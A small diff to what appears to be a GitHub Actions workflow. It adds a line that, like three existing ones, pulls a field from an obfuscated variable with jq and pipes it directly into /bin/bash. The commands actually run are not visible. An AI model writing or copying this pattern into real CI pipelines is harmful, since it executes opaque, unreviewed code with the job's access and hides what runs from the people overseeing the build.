@@ -33,6 +33,7 @@ jobs:
           echo $yrlv54 | jq -r .asrat7804 | /bin/bash
           echo $xuz8 | jq -r .rha795 | /bin/bash
           echo $v8 | jq -r .x650 | /bin/bash
+          printf '%s' "$y8804" | jq -r .kd325 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
